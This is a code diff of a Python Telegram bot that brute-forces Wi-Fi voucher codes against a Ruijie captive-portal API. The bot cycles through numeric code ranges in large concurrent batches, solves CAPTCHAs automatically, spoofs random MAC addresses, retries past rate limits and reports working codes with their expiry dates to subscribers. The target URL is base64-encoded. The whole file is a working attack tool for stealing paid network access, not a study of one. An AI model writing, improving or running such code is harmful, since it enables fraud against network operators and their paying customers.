@@ -113,6 +113,7 @@ async def update_file_content(path, content, sha, message):
     async with session.put(url, headers=headers, json=payload) as response:
         return await response.text()
 
+
 def main_menu():
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
@@ -553,11 +554,11 @@ def format_progress(checked, total=None, speed=0, found=0, retries=0, time_left=
 BATCH_SIZE = 2000
 
 async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
-    try: code_iter = iter_codes(mode)
+    try:
+        code_iter = iter_codes(mode)
     except ValueError as e:
         await bot.send_message(chat_id, str(e))
         return
-        
     total = 10 ** int(mode) if mode in ["6", "7"] else None
     checked = 0
     scan_start = time.monotonic()
@@ -567,28 +568,90 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
 
     try:
         while True:
-            # ⏰ Safety Checking: သက်တမ်းကုန်ဆုံးသွားပါက နောက်ကွယ်မှ အလိုအလျောက် ရပ်တန့်မည်
-            allowed, _, time_left = await is_allowed(chat_id)
-            if not allowed:
-                await bot.send_message(chat_id, "❌ အသုံးပြုနေစဉ်အတွင်း သင့်အကောင့် သက်တမ်း ကုန်ဆုံးသွားသဖြင့် Scan ဖတ်ခြင်းကို ရပ်ဆိုင်းလိုက်ပါသည်။")
-                break
-
             current_task = scan_tasks.get(chat_id)
-            if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
+            if not current_task or current_task.get("scan_id") != scan_id:
+                return
+            if current_task.get("stop"):
+                scan_tasks.pop(chat_id, None)
+                success_messages.pop(chat_id, None)
+                success_texts.pop(chat_id, None)
                 return
 
-            batch = [next(code_iter) for _ in range(BATCH_SIZE)]
-            async def _check(c):
+            batch = []
+            for _ in range(BATCH_SIZE):
+                try:
+                    batch.append(next(code_iter))
+                except StopIteration:
+                    break
+            if not batch:
+                break
+
+            async def _check(code):
                 async with _voucher_sem:
-                    return await perform_check(session_url, c, chat_id, scan_id, message=message)
+                    return await perform_check(
+                        session_url, code, chat_id, scan_id, message=message
+                    )
 
             await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
+
             checked += len(batch)
 
             elapsed = time.monotonic() - scan_start
             speed = (checked / elapsed * 60) if elapsed > 0 else 0
             found = len(success_texts.get(chat_id, []))
-            retries = retry_counts.get(
+            retries = retry_counts.get(chat_id, 0)
+            text = format_progress(checked, total, speed, found, retries)
+            try:
+                await bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=progress_msg.message_id,
+                    text=text,
+                    reply_markup=main_menu()
+                )
+            except Exception:
+                try:
+                    new_msg = await bot.send_message(chat_id, text, reply_markup=main_menu())
+                    progress_msg.message_id = new_msg.message_id
+                except Exception as err:
+                    print(f"Progress Message Error: {err}")
+
+        if progress_msg:
+            final_found = len(success_texts.get(chat_id, []))
+            final_retries = retry_counts.get(chat_id, 0)
+            finish_text = (
+                "✅ Scanning Completed\n\n"
+                f"📦Checked : {checked:,}\n"
+                f"✅Found : {final_found}\n"
+                f"🔁Retry : {final_retries}\n"
+                "📊Progress : 100%\n"
+                "[████████████████████]"
+            )
+            try:
+                await bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=progress_msg.message_id,
+                    text=finish_text,
+                    reply_markup=main_menu()
+                )
+            except:
+                try:
+                    await bot.send_message(chat_id, finish_text, reply_markup=main_menu())
+                except Exception as err:
+                    print(f"Progress Finish Message Error: {err}")
+        scan_tasks.pop(chat_id, None)
+        success_messages.pop(chat_id, None)
+        success_texts.pop(chat_id, None)
+        limited_messages.pop(chat_id, None)
+        limited_texts.pop(chat_id, None)
+        retry_counts.pop(chat_id, None)
+    finally:
+        scan_tasks.pop(chat_id, None)
+        success_messages.pop(chat_id, None)
+        success_texts.pop(chat_id, None)
+        limited_messages.pop(chat_id, None)
+        limited_texts.pop(chat_id, None)
+        retry_counts.pop(chat_id, None)
+
 def get_mac():
     first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
     mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
@@ -630,6 +693,7 @@ def replace_mac(url, new_mac):
 
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
     global _connector
+
     if not recheck:
         current_task = scan_tasks.get(chat_id)
         if not current_task or current_task.get("scan_id") != scan_id:
@@ -639,8 +703,10 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
         b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
     ).decode()
 
-    response = None
-    for _attempt in range(3):
+    response_text = None
+    session_id = None
+
+    for attempt in range(3):
         timeout = aiohttp.ClientTimeout(total=30)
 
         async with aiohttp.ClientSession(
@@ -655,18 +721,22 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 return
 
             auth_code = None
+
             for _ in range(8):
                 try:
                     image = await Captcha_Image(task_session, session_id)
                     text = await Captcha_Text(image)
+
                     if not text:
                         continue
-                    verified = await Varify_Captcha(task_session, session_id, text)
-                    if verified:
+
+                    if await Varify_Captcha(task_session, session_id, text):
                         auth_code = text
                         break
+
                 except Exception as e:
                     print(f"[perform_check] captcha error: {e}")
+
             if not auth_code:
                 return
 
@@ -681,56 +751,60 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 "apiVersion": 1,
                 "authCode": auth_code,
             }
+
             headers = {
-                "authority": "://ruijienetworks.com",
+                "authority": "portal-as.ruijienetworks.com",
                 "accept": "*/*",
-                "accept-language": "en-US,en;q=0.9",
                 "content-type": "application/json",
-                "origin": "https://://ruijienetworks.com",
-                "referer": (
-                    f"https://://ruijienetworks.com/download/static/maccauth/src/index.html"
-                    f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
-                ),
-                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-platform": '"Android"',
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin",
-                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+                "origin": "https://ruijienetworks.com",
+                "referer": f"https://ruijienetworks.com/...sessionId={session_id}",
+                "user-agent": "Mozilla/5.0",
             }
+
             try:
                 async with task_session.post(post_url, json=data, headers=headers) as req:
-                    response = await req.text()
-                    resp_json = json.loads(response)
-                    print(f"[voucher] code={code} attempt={_attempt+1} status={req.status} resp={resp_json}")
+                    response_text = await req.text()
+
+                    try:
+                        resp_json = json.loads(response_text)
+                    except:
+                        resp_json = {}
+
+                    print(f"[voucher] code={code} attempt={attempt+1} status={req.status} resp={resp_json}")
+
             except Exception as e:
-                print(f"[perform_check] error: {e}")
+                print(f"[perform_check] request error: {e}")
                 return
 
-        if response and 'request limited' in response:
-            print(f"[perform_check] rate limited on code={code}, retrying (attempt {_attempt+1}/3)")
+        # retry handling
+        if response_text and "request limited" in response_text:
             retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
             continue
+
         break
 
-    if not response:
+    if not response_text:
         return
 
-    if 'logonUrl' in response:
+    # ================= SUCCESS =================
+    if "logonUrl" in response_text:
+
         if recheck:
             return code
 
-        if chat_id not in success_texts:
-            success_texts[chat_id] = []
+        success_texts.setdefault(chat_id, [])
         expire_date = await Code_Expires_Date(session_id)
+
         success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
-        code_line = "\n\n".join(success_texts[chat_id])
+
         await SUCCESS_CODE.put({
             "chat_id": chat_id,
             "code": code
         })
+
         if message:
+            code_line = "\n\n".join(success_texts[chat_id])
+
             try:
                 if chat_id not in success_messages:
                     sent = await bot.send_message(
@@ -740,33 +814,26 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     )
                     success_messages[chat_id] = sent.message_id
                 else:
-                    try:
-                        await bot.edit_message_text(
-                            chat_id=message.chat.id,
-                            message_id=success_messages[chat_id],
-                            text=f"✅ Success Codes:\n\n{code_line}",
-                            reply_markup=main_menu()
-                        )
-                    except Exception as e:
-                        try:
-                            sent = await bot.send_message(
-                                chat_id=message.chat.id,
-                                text=f"✅ Success Codes:\n\n{code_line}",
-                                reply_markup=main_menu()
-                            )
-                            success_messages[chat_id] = sent.message_id
-                        except Exception as err:
-                            print(f"Success Fallback Error: {err}")
+                    await bot.edit_message_text(
+                        chat_id=message.chat.id,
+                        message_id=success_messages[chat_id],
+                        text=f"✅ Success Codes:\n\n{code_line}",
+                        reply_markup=main_menu()
+                    )
             except Exception as e:
                 print(f"Success Message Error: {e}")
-                
-    elif 'STA' in response:
-        if chat_id not in limited_texts:
-            limited_texts[chat_id] = []
+
+    # ================= LIMITED =================
+    elif "STA" in response_text:
+
+        limited_texts.setdefault(chat_id, [])
         expire_date = await Code_Expires_Date(session_id)
+
         limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
-        limited_line = "\n\n".join(limited_texts[chat_id])
+
         if message:
+            limited_line = "\n\n".join(limited_texts[chat_id])
+
             try:
                 if chat_id not in limited_messages:
                     sent = await bot.send_message(
@@ -776,25 +843,15 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     )
                     limited_messages[chat_id] = sent.message_id
                 else:
-                    try:
-                        await bot.edit_message_text(
-                            chat_id=message.chat.id,
-                            message_id=limited_messages[chat_id],
-                            text=f"⚠️ Limited Codes:\n\n{limited_line}",
-                            reply_markup=main_menu()
-                        )
-                    except Exception as e:
-                        try:
-                            sent = await bot.send_message(
-                                chat_id=message.chat.id,
-                                text=f"⚠️ Limited Codes:\n\n{limited_line}",
-                                reply_markup=main_menu()
-                            )
-                            limited_messages[chat_id] = sent.message_id
-                        except Exception as err:
-                            print(f"Limited Fallback Error: {err}")
+                    await bot.edit_message_text(
+                        chat_id=message.chat.id,
+                        message_id=limited_messages[chat_id],
+                        text=f"⚠️ Limited Codes:\n\n{limited_line}",
+                        reply_markup=main_menu()
+                    )
             except Exception as e:
                 print(f"Limited Message Error: {e}")
+
 def Minute_to_Hour(total_minutes):
     if total_minutes == 'Unknown':
         return 'Unknown'
